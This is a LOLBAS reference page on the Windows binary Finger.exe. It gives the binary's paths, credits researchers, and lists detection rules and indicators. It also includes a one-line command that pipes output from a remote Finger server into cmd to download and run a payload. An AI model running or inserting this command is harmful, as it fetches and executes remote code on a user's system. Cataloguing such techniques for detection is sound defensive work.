---
title: "Finger.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Finger/
fetched_at: 2026-09-20T17:10:10Z
license: unspecified
category: windows
---

Displays information about a user or users on a specified remote computer that is running the Finger service or daemon

## Paths
- c:\windows\system32\finger.exe
- c:\windows\syswow64\finger.exe

## Resources
- [https://twitter.com/DissectMalware/status/997340270273409024](https://twitter.com/DissectMalware/status/997340270273409024)
- [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11))

## Acknowledgements
- Ruben Revuelta (MAPFRE CERT) ([@rubn_RB](https://twitter.com/@rubn_RB))
- Jose A. Jimenez (MAPFRE CERT) ([@Ocelotty6669](https://twitter.com/@Ocelotty6669))
- Malwrologist ([@DissectMalware](https://twitter.com/@DissectMalware))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml)
- IOC: finger.exe should not be run on a normal workstation.
- IOC: finger.exe connecting to external resources.

## Download

1. Downloads payload from remote Finger server. This example connects to “example.host.com” asking for user “user”; the result could contain malicious shellcode which is executed by the cmd process.

```
finger user@example.host.com | more +2 | cmd
```

   - Use case: Download malicious payload

   - Privileges required: User

   - Operating systems: Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022

   - ATT&CK® technique: T1105
